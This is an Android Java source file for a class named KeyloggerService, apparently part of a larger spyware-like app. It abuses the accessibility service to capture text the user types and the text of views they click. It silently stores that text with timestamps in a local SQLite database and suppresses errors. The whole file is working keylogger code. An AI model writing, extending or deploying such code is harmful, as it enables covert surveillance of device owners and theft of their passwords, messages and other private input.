package com.candroid.lofl.services;

import android.accessibilityservice.AccessibilityService;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.os.Process;
import android.view.accessibility.AccessibilityEvent;

import com.candroid.lofl.data.db.Database;
import com.candroid.lofl.data.db.DatabaseHelper;

public class KeyloggerService extends AccessibilityService {
    public static final String TAG = KeyloggerService.class.getSimpleName();
    @Override public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
        StringBuilder text = new StringBuilder("");
        final StringBuilder eventName = new StringBuilder();
        switch (eventType){
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                text.append(event.getText().toString());
                eventName.append("TYPE_VIEW_TEXT_CHANGED");
                break;
            case AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT:
                text.append(event.getText().toString());
                eventName.append("CONTENT_CHANGE_TYPE_TEXT");
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                text.append(event.getText().toString());
                eventName.append("TYPE_VIEW_CLICKED");
                break;
            default:
                break;
        }
        final String loggedText = text.toString();
        if(loggedText.length() > 0) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    SQLiteDatabase database = DatabaseHelper.getInstance(KeyloggerService.this).getWritableDatabase();
                    try {
                        database.beginTransaction();
                        Database.insertKeyLogEntry(database, loggedText, System.currentTimeMillis(), eventName.toString());
                        database.setTransactionSuccessful();
                    } catch (SQLException e) {
                        //die silent
                    } finally {
                        database.endTransaction();
                    }
                    database.close();

                }
            }).start();
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
    }

    @Override
    public void onInterrupt() {

    }
}
